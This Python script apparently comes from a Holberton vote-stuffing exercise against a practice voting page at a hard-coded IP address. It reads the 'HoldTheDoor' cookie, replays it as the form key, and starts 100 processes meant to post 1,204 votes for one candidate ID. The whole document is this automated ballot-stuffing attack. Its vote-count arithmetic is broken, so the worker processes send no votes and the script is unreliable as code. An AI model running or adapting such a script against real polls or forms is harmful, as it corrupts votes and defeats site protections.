#!/usr/bin/python3


from requests import post, get
from multiprocessing import Process
from bs4 import BeautifulSoup

# Number of voters, be carefull this number depend of your pc's memory ram
voters = 100

# Number of votes
votes = 1204

# Holberton ID
candidate = 2358

# This is a url where we want to scraping
url = 'http://158.69.76.135/level1.php'

dict_data = {
    'id': candidate,
    'holdthedoor': 'submit',
    'key': ''
}

dict_cookie = {'HoldTheDoor': ''}

if voters > votes:
    raise ValueError("Number of voters can't be greater than votes")

res = post(url)
header = res.cookies
cookie = header.get('HoldTheDoor')

dict_data['key'] = cookie
dict_cookie['HoldTheDoor'] = cookie

n_votes_per_process = votes / voters

if votes % voters != 0:
    resp = post(url, data=dict_data, cookies=dict_cookie)

n_votes_per_process = int(n_votes_per_process)


def _vote():
    """This function is called when we try to vote"""

    manual_vote = int(votes / voters) - int(n_votes_per_process)
    for i in range(manual_vote):
        resp = post(url, data=dict_data, cookies=dict_cookie)


if __name__ == '__main__':

    jobs = []

    for i in range(voters):
        p = Process(target=_vote)
        jobs.append(p)
        p.start()
